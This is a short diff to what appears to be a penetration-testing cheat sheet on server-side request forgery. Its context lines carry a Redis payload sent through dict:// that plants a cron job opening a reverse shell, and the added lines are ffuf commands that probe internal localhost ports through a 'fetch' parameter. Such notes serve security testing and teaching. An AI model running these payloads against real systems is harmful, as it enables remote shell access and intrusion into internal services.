@@ -548,6 +548,12 @@ for i in {1..10000}; do curl -s -i http://site.org/index.php --data "url=http://
 dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port> 0>\x261\n\n\n"
 ```
 
+```bash
+# fs : filter response size , matches != 2000
+ffuf -c -w `fzf-wordlists` -X POST -u "http://$TARGET/" -d 'fetch=http://localhost:8080/FUZZ' 
+ffuf -c -w `fzf-wordlists` -X POST -u "http://$TARGET/" -d 'fetch=http://localhost:8000/FUZZ'  -fs 2000
+```
+
 ### Edge side include
 
 - https://book.hacktricks.wiki/en/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html
